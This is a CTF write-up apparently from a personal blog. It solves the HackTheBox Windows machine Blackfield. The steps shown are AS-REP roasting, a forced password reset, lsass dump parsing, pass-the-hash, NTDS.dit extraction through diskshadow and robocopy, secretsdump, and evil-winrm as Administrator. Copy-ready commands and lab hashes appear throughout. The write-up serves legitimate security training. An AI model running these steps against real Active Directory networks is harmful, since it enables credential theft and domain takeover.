---
title: "Blackfield - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - hard
  - windows
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## Blackfield
![](https://kar0nx.github.io/assets/images/writeup/7c69c876f496cd729a077277757d219d.png)
## Reconnaissance

IP: 10.10.10.192
## NMAP

```
nmap -T4 -p- 10.10.10.192
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-03 15:42 UTC
Stats: 0:00:39 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 62.76% done; ETC: 15:43 (0:00:24 remaining)
Nmap scan report for blackfield.local (10.10.10.192)
Host is up (0.030s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 53.33 seconds

```

## SMB

Starting with smb, we can spot that as Guest we have access to profiles share.

```
nxc smb 10.10.10.192 -u "Guest" -p "" --shares

nxc smb 10.10.10.192 -u "Guest" -p "" --share 'profiles$' --dir
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903173221.png)

All empty directories, but names could be possible usernamse, I will user nxc over smbclient this time, cause it is easier to copy names. Save it to txt and cut only usernames using awk:

```
cat users.txt | awk '{print $12}' > usernames.txt
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903173429.png)

### ASREPRoast

Tried user as password but no result, next thought is searching for  AS-REP Roasting with usernames, I probably should use kerbrute first to cut only valid users but it was speedrun :D

```
for user in $(cat usernames.txt); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.192 blackfield.local/$user | grep krb5asrep; done
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903174513.png)

Great we have support user, and I was able to crack password

```
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --show
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903174653.png)

support `#00^BlackKnight`
Checking permissions 

```
nxc smb 10.10.10.192 -u "support" -p "#00^BlackKnight"
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903174858.png)

No more access in share, no Pwned!, so checked bloodhound for other privs

```
bloodhound-python -d BLACKFIELD.local -u support -p '#00^BlackKnight' -ns 10.10.10.192 -c all
```

Ok starting I see outbound object control and it is ForceChangePassword to audit2020 user

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903175529.png)

```
net rpc password "audit2020" "newP@ssword2022" -U "BLACKFIELD.local"/"support"%"#00^BlackKnight" -S "10.10.10.192"
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250904095432.png)

 And now we can try audit2020 user

```
nxc smb 10.10.10.192 -u "audit2020" -p "newP@ssword2022" --users
```

Ok one more thing I notice that there is over 300 users in domain, again let's make a list.
Quick change password via 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903180322.png)

I search for valid users, so again cut users and continue searching 

```
cat es.txt | awk '{print $5}' > usernames.txt
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903180728.png)

also I found that audit2020 have access to forensic share

```
nxc smb 10.10.10.192 -u "audit2020" -p "newP@ssword2022" --shares

nxc smb 10.10.10.192 -u "audit2020" -p "newP@ssword2022" --share forensic --dir
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903180940.png)

now connect via smbclient to download this files

```
smbclient \\\\10.10.10.192\\forensic -U audit2020

recurse ON
prompt OFF
mget *
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903181135.png)

ok, that wasn't good idea. XD Learn from mistakes, thats a lot of freaking data. But fast enumeration, from newest file. And I found lsass.zip. lsass is where domain credentials are

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903182133.png)

download it, unzip and dump via pypykatz

```
pypykatz lsa minidump lsass.DMP
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903182527.png)

I found only 3 different ntlm hashes, let's attempt to crack it
Can't crack via rockyou so let's try pass the hash

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903183118.png)

only 2 that may be valid so I made it manualy and svc_backup works

```
nxc smb 10.10.10.192 -u "svc_backup" -H 9658d1d1dcd9250115e2205d9f48400d
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903183459.png)

## Privilege Escation

back to bloodhound and I am very happy when I see High Value Target on owned account 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903183703.png)

svc_backup is in backup operators group so ntds.dit dump

### Dumping the NTDS.dit

https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration
Tried this but didn't work, and I found easy and clear answer in jugernautsec writeup
https://juggernaut-sec.com/hackthebox-blackfield/

Since diskshadow.exe is an interactive command and we currently have a non-interactive session, we have to craft a TXT file that we can feed into diskshadow.exe. This will allow us to execute the necessary commands to create our shadow copy.

```
mkdir c:/temp

cd c:/temp

echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii 

echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append 

echo "create" | out-file ./diskshadow.txt -encoding ascii -append 

echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903192150.png)

After creating the diskshadow.txt file, I used the the following command to create a shadow copy and make it visible as the Z:\ drive:

```
diskshadow.exe /s c:\temp\diskshadow.txt
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903192242.png)

With the Z:\ drive exposed, I can now use robocopy again but this time it will be used to move the backup ntds.dit file to my temp folder and not the running one.

```
cd z:/windows/ntds
robocopy /b .\ C:\temp NTDS.dit
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903192401.png)

Move to c:/temp and get system file, then download it to kali machine

```
cd C:\temp 

reg.exe save hklm\system C:\temp\system.bak

download ntds.dit 

download system.bak
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903192816.png)

With both files now on my attacker machine, I used secretsdump.py again and successfully dumped all of the hashes in the domain!

```
secretsdump.py -ntds ntds.dit -system system.bak LOCAL > hashes.txt
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903192903.png)

Now we can copy administrator hash, connect via evil-winrm and grab root.txt

```
evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903193023.png)